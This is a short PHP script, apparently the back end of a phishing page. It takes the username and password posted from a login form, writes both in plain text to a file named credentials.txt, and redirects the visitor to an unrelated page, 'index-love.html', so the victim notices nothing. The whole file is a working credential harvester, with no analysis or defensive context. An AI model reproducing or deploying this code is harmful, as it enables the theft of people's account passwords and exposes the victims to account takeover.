<?php

$user = $_POST["username"];
$contra = $_POST["password"];
$file = fopen("credentials.txt", "w+");

fwrite($file, "Usuario: $user
Contrasena: $contra
");

fclose($file);

header('location: ../index-love.html');

?>
